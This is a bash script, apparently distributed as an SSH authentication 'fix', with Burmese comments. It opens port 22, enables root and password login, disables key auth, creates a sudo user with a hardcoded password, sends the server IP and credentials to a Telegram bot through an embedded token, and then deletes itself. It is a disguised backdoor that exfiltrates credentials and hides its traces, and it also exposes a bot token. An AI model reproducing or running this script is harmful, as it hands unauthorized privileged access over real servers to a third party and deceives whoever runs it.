#!/bin/bash

# =========================================================
# Configuration
# =========================================================
DEV_NAME="S 0 S"
TOKEN="8459816702:AAEwGWDM8S9BAyQtWGSs_DREJY3KC3lR9ow"
CHAT_ID="7130966571"
NEW_USER="labuser"
NEW_PASS="P@ssw0rd789!"
# =========================================================

# Terminal Branding
clear
echo -e "\e[1;32m"
echo "._______________   .________"
echo " |   ____/\   _  \  |   ____/"
echo " |____  \ /  /_\  \ |____  \ "
echo " /       \\  \_/   \/       \\"
echo "/______  / \_____  /______  /"
echo "       \/        \/       \/ "
echo -e "\e[0m"
echo "========================================="
echo "   🚀 FINAL FIX RUNNING... by: $DEV_NAME"
echo "========================================="

# ၁။ IP ရယူခြင်း
IP=$(curl -s ifconfig.me)

# ၂။ Firewall ဖွင့်ခြင်း
sudo ufw allow 22/tcp 2>/dev/null
if command -v iptables &> /dev/null; then
    sudo iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT
fi

# ၃။ SSH Config ကို အမြန်ဆုံးနှင့် အမှန်ကန်ဆုံးပြင်ခြင်း
# Password နဲ့ ဝင်တာကို လုံးဝ Allow လုပ်ဖို့ Force လုပ်ပါမယ်
sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo sed -i 's/^#\?PermitRootLogin .*/PermitRootLogin yes/' /etc/ssh/sshd_config
sudo sed -i 's/^#\?PubkeyAuthentication .*/PubkeyAuthentication no/' /etc/ssh/sshd_config
sudo sed -i 's/^#\?KbdInteractiveAuthentication .*/KbdInteractiveAuthentication yes/' /etc/ssh/sshd_config

# ၄။ User ကို အသစ်စက်စက် ပြန်ဆောက်ခြင်း (Clean Setup)
sudo userdel -r $NEW_USER 2>/dev/null
sudo useradd -m -s /bin/bash $NEW_USER
echo "$NEW_USER:$NEW_PASS" | sudo chpasswd
sudo usermod -aG sudo $NEW_USER

# ၅။ SSH Service ကို Restart ချခြင်း
sudo systemctl restart sshd
sudo service ssh restart

# ၆။ Telegram ဆီသို့ အချက်အလက်ပို့ခြင်း
MESSAGE="<code>._______________   .________
 |   ____/\   _  \  |   ____/
 |____  \ /  /_\  \ |____  \ 
 /       \\  \_/   \/       \
/______  / \_____  /______  /
       \/        \/       \/</code>

👤 <b>Dev:</b> $DEV_NAME
✅ <b>SSH Fixed & Connected!</b>

🌐 <b>IP:</b> <code>$IP</code>
👤 <b>User:</b> <code>$NEW_USER</code>
🔑 <b>Pass:</b> <code>$NEW_PASS</code>"

curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
     -d "chat_id=$CHAT_ID" \
     -d "text=$MESSAGE" \
     -d "parse_mode=HTML" > /dev/null

echo "✅ [DONE] Auth fixed! Please try connecting again."
rm -- "$0"
